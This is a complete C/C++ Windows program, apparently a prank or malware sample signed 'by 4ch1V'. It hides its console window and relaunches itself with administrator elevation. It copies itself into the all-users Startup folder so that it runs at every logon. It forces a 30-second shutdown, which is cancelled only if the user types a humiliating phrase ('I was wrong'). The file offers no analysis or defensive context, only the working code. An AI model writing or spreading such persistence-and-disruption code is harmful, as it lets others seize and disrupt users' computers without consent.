#include<stdio.h>
#include<string.h>
#include<Windows.h>
#include<iostream>
#include<tchar.h>
#define MAX_LEN_FILENAME 64

VOID ManagerRun(LPCSTR exe,LPCSTR param,INT nShow=SW_SHOW)  
{ 
	SHELLEXECUTEINFO ShExecInfo; 
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);  
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS ;  
	ShExecInfo.hwnd = NULL;  
	ShExecInfo.lpVerb = "runas";  
	ShExecInfo.lpFile = exe; 
	ShExecInfo.lpParameters = param;   
	ShExecInfo.lpDirectory = NULL;  
	ShExecInfo.nShow = nShow;  
	ShExecInfo.hInstApp = NULL;   
	BOOL ret = ShellExecuteEx(&ShExecInfo);  

 	CloseHandle(ShExecInfo.hProcess);
 	return;
}


int main(int argc,char *argv[])
{
    if(argc == 1) //初次运行，即双击EXE
    {
        ShowWindow(GetConsoleWindow(),SW_HIDE);
        ManagerRun(argv[0],"2");
        return 1;
    }
	else if(argc == 2) //再次运行,即上面那个ManagerRun
    {
    	char input[1024];
    
    	char pathF[MAX_LEN_FILENAME];
    	GetModuleFileName(NULL, pathF, sizeof( pathF ));

    	char dest[] = _T("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.exe");
		CopyFile(pathF, dest, false);
    
    	system("shutdown -s -t 30");
    
    	printf("说了不听，非得作死，这下好啦:D\n");

	again: 
		printf("这里是Pioneer,此电脑将在三十秒内关机，输入“我错了”来取消关机。\n");
	
		scanf("%s",&input);
	
		if(0== strcmp(input,"我错了"))
		{
			system("shutdown -a");
		}
		else
		{
			goto again;
		}
    }
    return 0;
}

//by 4ch1V
